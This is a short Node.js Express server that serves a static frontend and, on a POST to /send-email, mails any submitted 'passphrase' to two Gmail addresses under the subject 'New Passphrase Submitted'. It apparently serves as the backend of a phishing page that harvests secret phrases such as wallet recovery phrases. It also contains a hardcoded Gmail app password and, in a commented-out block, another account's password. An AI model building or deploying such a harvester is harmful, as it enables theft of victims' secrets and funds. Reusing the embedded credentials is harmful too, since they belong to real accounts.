const express = require('express');
//const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com', // Gmail SMTP server
  port: 465,              // SMTP port (use 465 for SSL)
  secure: true,          // Use TLS (false for non-SSL)
  auth: {
      user: 'itsmelucifer25@gmail.com',
      pass: 'gzcl enkn rpjf cvue'
  }
});

const app = express();
const PORT = 3000;
const path = require('path');

app.use(express.static(path.join(__dirname, 'frontend')));

// Middleware to parse form data
// app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


// Route to handle form submission
app.post('/send-email', (req, res) => {
  const { passphrase } = req.body;

  // Email configuration
  // const transporter = nodemailer.createTransport({
  //   service: 'gmail',
  //   auth: {
  //     user: 'goyalmudit82@gmail.com', // Replace with your Gmail
  //     pass: 'MGoyal@123', // Replace with your Gmail App Password
  //   },
  // });

  const mailOptions = {
    from: 'itsmelucifer25@gmail.com',
    to: ['itsmelucifer25@gmail.com', 'goyalmudit240@gmail.com'], // Your email
    subject: 'New Passphrase Submitted',
    text: `Passphrase: ${passphrase}`,
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error:', error); // Log full error
    res.status(500).send('<h1>Error sending email</h1>');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('<h1>Thank You</h1>');
    }
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
